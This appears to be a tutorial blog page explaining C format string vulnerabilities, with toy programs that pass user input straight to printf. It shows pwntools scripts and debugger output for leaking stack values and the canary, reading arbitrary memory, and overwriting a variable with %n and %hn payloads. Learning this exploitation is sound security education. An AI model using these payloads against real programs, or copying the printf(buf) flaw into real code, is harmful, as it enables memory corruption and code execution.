---
layout: page
title: Format Strings
tags: [format_strings, pwn]
---

Format specifiers in C are used to take inputs and print the output of a type. It is a way to tell the compiler the type of data that is being used for i/o. They are mostly used with the printf and scanf family of functions such as printf, sprintf, scanf, sscanf. The following table shows the use of various format specifiers in C / C++

<table>
	<thead>
		<tr>
			<th>Format specifier</th>
			<th>Used for</th>
		</tr>
	</thead>
	<tr>
		<td>%c</td>
		<td>A single character</td>
	</tr>
		<tr>
		<td>%s</td>
		<td>A string</td>
		</tr>
	<tr>
		<td>%hi</td>
		<td>short (signed)</td>
	</tr>
	<tr>
		<td>%hu</td>
		<td>short (unsigned)</td>
	</tr>
	<tr>
		<td>%lu</td>
		<td>long (unsigned)</td>
	</tr>
	<tr>
		<td>%i</td>
		<td>A decimal integer</td>
	</tr>
	<tr>
		<td>%o</td>
		<td>An octal integer</td>
	</tr>
	<tr>
		<td>%x</td>
		<td>A hexadecimal integer</td>
	</tr>
	<tr>
		<td>%p</td>
		<td>An address( or pointer )</td>
	</tr>
	<tr>
		<td>%f</td>
		<td>Floating point numbers</td>
	</tr>
	<tr>
		<td>%%</td>
		<td>The % symbol</td>
	</tr>
	<tr>
		<td>%u</td>
		<td>unsigned int</td>
	</tr>
	<tr>
		<td>i$</td>
		<td>Direct parameter access, specifies the parameter to use for input</td>
	</tr>
	<tr>
		<td>%ix</td>
		<td>Width modifier. Specifies the minimum width of output</td>
	</tr>
	<tr>
		<td>%hh</td>
		<td>Specifies that the length is one byte</td>
	</tr>
		<tr>
		<td>%h</td>
		<td>Specifies that the length is two bytes</td>
	</tr>
		</tr>
		<tr>
		<td>%n</td>
		<td>writes number of characters printed by to a variable (only the characters present before %n in a string count)</td>
	</tr>
</table>

## Format String Bug
It occurs when the user input is passed as format argument to the printf or scanf family of functions. Consider a simple C program:
```c
#include<stdio.h>

void func(){
	unsigned long x1 = 0xdeadbeef;
	unsigned long x2 = 0xcafebabe;
	unsigned long x3 = 0xbabecafe;
	unsigned long x4 = 0xd00df00d;
	char buf[32] ;
	fgets(buf,32,stdin);
	printf(buf);
}
int main(){
	func();
	return 0;
}
```
Let's send a bunch of `%p` and see what happens. 
<img src='https://raw.githubusercontent.com/0xSh4dy/0xSh4dy.github.io/master/assets/img/fmtstr/fmtstr_01.png'>
Thus, we see that we can dump local stack variables. Format string bug is so powerful, it may lead to memory corruption and arbitrary code execution. The first few QWORDs come from printf's stack and the data after that comes from the stack of the caller function.
The `rsp` register stores a pointer to the top of the stack. Let's say this pointer is `ptr`. Then, in this case, `%6$p` gives the value stored at `*ptr`, `%7$p` gives the value stored at *(ptr+8), `%8$p` gives the value stored at *(ptr+16) and so on. Let's verify this using `pwndbg`.
```py
pwndbg> b *0x0000000000401263
```
With the breakpoint set right after the call to printf, we can run the program and send this input `%6$p.%7$p.%8$p.%9$p`.

<img src='https://github.com/0xSh4dy/0xSh4dy.github.io/blob/master/assets/img/fmtstr/fmtstr_03.png?raw=true'>
This gives the output `0xdeadbeef.0xcafebabe.0xbabecafe.0xd00df00d`. Let's examine the stack pointer.
```py
pwndbg> p/x $rsp
$1 = 0x7fffffffdce0
pwndbg> x/10gx 0x7fffffffdce0
0x7fffffffdce0:	0x00000000deadbeef	0x00000000cafebabe
0x7fffffffdcf0:	0x00000000babecafe	0x00000000d00df00d
0x7fffffffdd00:	0x2437252e70243625	0x252e702438252e70
0x7fffffffdd10:	0x00007f000a702439	0x00000000004012a0
0x7fffffffdd20:	0x0000000000000000	0x5ff669990d493f00

```
We can also compute the offset to the stack canary using the concept mentioned above. The canary is stored at (ptr+72) which means that the payload to dump it would be %15$p (72/8 + 6 = 15)

```py
pwndbg> r
Starting program: /home/sh4dy/InfoSec/pwn/fmtstr/chall
%15$p
0xd93923e60f223e00
```

### Reading data from a particular address
Instead of reading the data stored at the stack, we would like to read data from any arbitrary location. Consider the following program:
```c
#include<stdio.h>
#include<string.h>

char secret[32];

void setup(){
	strcpy(secret,"format_strings_are_cool");
}

void func(){
	unsigned long x = 0xdeadbeef;
	char buf[32];
	scanf("%32s",buf);
	printf(buf);
}

int main(){
	setup();
	func();
	return 0;
}
```
Our goal is to read the contents of the array `secret`. To do that, we can insert the address of `secret` into the stack and read it using `%s`. The address must be aligned properly.
```py
pwndbg> b *func+77
Breakpoint 1 at 0x401201
```
Let's run the program and send the input `aaaaaaaabbbbbbbb` and dump few QWORDS from the pointer stored at `rsp`
```py
pwndbg> dq  $rsp 10

00007fffffffdd40     00000000000000c2 00000000deadbeef
00007fffffffdd50     6161616161616161 6262626262626262
00007fffffffdd60     00007ffff7fb1200 0000000000401240
00007fffffffdd70     0000000000000000 910b6acb4da2ec00
00007fffffffdd80     00007fffffffdd90 0000000000401234
```
Here, `%6$p` prints `0xc2`, `%7$p` prints `0xdeadbeef` and so on. In order to perform an arbitrary read, we can insert the target address at some location on the stack and read it using `%i$s` where `i` is the offset. This task can be done easily using `pwntools`.

```py
#!/usr/bin/env python3

from pwn import *
elf = context.binary = ELF("./chall")

p = elf.process()

gdb.attach(p,gdbscript="b*func+77")
payload = b'aaaa%9$s'+ p32(elf.sym.secret)
pause()
p.sendline(payload)
p.interactive()
```
Running the script and dumping the stack, we get:
```py
pwndbg> x/10gx $rsp
0x7fff7d03ed10:	0x00000000000000c2	0x00000000deadbeef
0x7fff7d03ed20:	0x7324392561616161	0x0000000000404060
0x7fff7d03ed30:	0x00007fd2daa302e8	0x0000000000401240
0x7fff7d03ed40:	0x0000000000000000	0xef1d016c9183a200
0x7fff7d03ed50:	0x00007fff7d03ed60	0x0000000000401234
```
`0x404060` is the address of the buffer `secret`. It is stored at the offset `9`. Sending `%9$s` with some padding to account for the 8 byte alignment would print the string stored at `0x404060`.
<img src='https://github.com/0xSh4dy/0xSh4dy.github.io/blob/master/assets/img/fmtstr/fmtstr_04.png?raw=true'>


### The `%n` format specifier
`%n` causes `printf` to load the variable pointed by the corresponding argument with a value equal to the number of characters that have been printed by `printf`(for the current call) before the occurence of `%n`.

```c
#include<stdio.h>

int main(){
	int var;
	printf("Yo,wassup?%n\n",&var);
	printf("var -> %d\n",var);
	return 0;
}
```
Let's run this program.
```py
➜  formatStrings ./temp 
Yo,wassup?
var -> 10
```


### Arbitrary Write using format strings
Format string bugs can also be used to write data to arbitrary locations. Let's create a basic C application that can be exploited via format string attacks.
```c
#include<stdio.h>
#include<string.h>

unsigned long modify_me = 0xdeadbeef;

void func(){
	char buf[56];
	scanf("%56s",buf);
	printf(buf);
}

int main(){
	printf("\nInitial value of modify_me -> 0x%lx\n",modify_me);
	func();
	printf("\nFinal value of modify_me -> 0x%lx\n",modify_me);
	return 0;
}

```
Our goal is to modify the value of the global variable `modify_me`. Let's dump the stack (using the same technique used before)
```py
pwndbg> x/10gx $rsp
0x7fffffffdd40:	0x6161616161616161	0x6262626262626262
0x7fffffffdd50:	0x00007fffffffdd00	0x000000000040126d
0x7fffffffdd60:	0x00007ffff7fb12e8	0x0000000000401220
0x7fffffffdd70:	0x0000000000401220	0x6da2ce890c4c5800
0x7fffffffdd80:	0x00007fffffffdd90	0x00000000004011fe

```
`aaaaaaaa` is stored at the offset 6 (it can be verified by sending `aaaaaaaa.%6$p`). Let's store the address of `modify_me` at the offset 7 and write 4 bytes into it.
```py
#!/usr/bin/env python3

from pwn import *
elf = context.binary = ELF("./chall")

p = elf.process()
payload = b'aaaa%7$n'+ p32(elf.sym.modify_me)
p.sendline(payload)
p.interactive()
```
<img src='https://github.com/0xSh4dy/0xSh4dy.github.io/blob/master/assets/img/fmtstr/fmtstr_05.png?raw=true'>

The value of the variable `modify_me` was overwritten by the value 4 because our payload forced `printf` to print 4 bytes (`aaaa`). The payload `b'0%3c%7$n'+ p32(elf.sym.modify_me)` can be used to do the same thing. It would be really awesome if we overwrite the variable by particular value, let's say `0xcafebabe`. Now, you might be thinking about forcing printf to print `0xcafebabe` number of characters. This method is not efficient because you'll need to wait for printf to print `0xcafebabe` no. of characters which may take time. Instead, we'll try to write one or two bytes at a time. The format specifier `%h` specifies that the length is two bytes. We can use it for our advantage. 

Here, the address of `modify_me` is 0x404040. Our goal is to write `0xcafebabe` at this address. Instead of writing the entire number, we can write data in chunks i.e 2 bytes at a time. We can use `%hn` for that. The part of the stack storing our payload should look like this:
```
payload_1                 payload_1_continued

payload_2                 payload_2_continued

address_1(0x404040)       address_2(0x404042)
```
Writing `0xbabe` at `0x404040` and `0xcafe` at `0x404042` will do the job (assuming little-endian architecture). In this case, the target addresses that should be overwritten are stored at offsets 10 and 11 respectively. Please note that the payload size should be a multiple of 8 bytes. Let's craft the payload now.
47806 is the decimal representation of 0xbabe.
So, the default payload for writing 0xbabe at the address stored at offset 10 would be `%47806c%10$hn`. Let's add some padding to make its size a multiple of 8 bytes (it would ensure that the target address remain aligned). Adding 3 characters and decreasing 47806 by 3 would do the job. So, the new padded payload is `aaa%47803c%10$hn`. Now, let's craft a payload to write `0xcafe (51966 in decimal)` at the address stored at the offset 11. Please note that in this case, the entire payload is passed to a single printf, and 47806 bytes have already been written by printf. This means that we only need to add 4160 more bytes (0xcafe-0xbabe). `aaaa%4156c%11$hn` will do the job. Let's write a simple python script.
```py
#!/usr/bin/env python3

from pwn import *
elf = context.binary = ELF("./chall")

p = elf.process()

target = 0x404040

payload = b''
payload +=b'aaa%47803c%10$hn'
payload += b'aaaa%4156c%11$hn'
payload += p64(0x404040)
payload += p64(0x404042)

p.sendline(payload)
p.interactive()
```
<img src='https://github.com/0xSh4dy/0xSh4dy.github.io/blob/master/assets/img/fmtstr/fmtstr_06.png?raw=true'>


Awesome, isn't it?





References:
<br>

[https://www.freecodecamp.org/news/format-specifiers-in-c/](https://www.freecodecamp.org/news/format-specifiers-in-c/)
[https://kevinalmansa.github.io/application%20security/Format-Strings/](https://kevinalmansa.github.io/application%20security/Format-Strings/)
[https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)

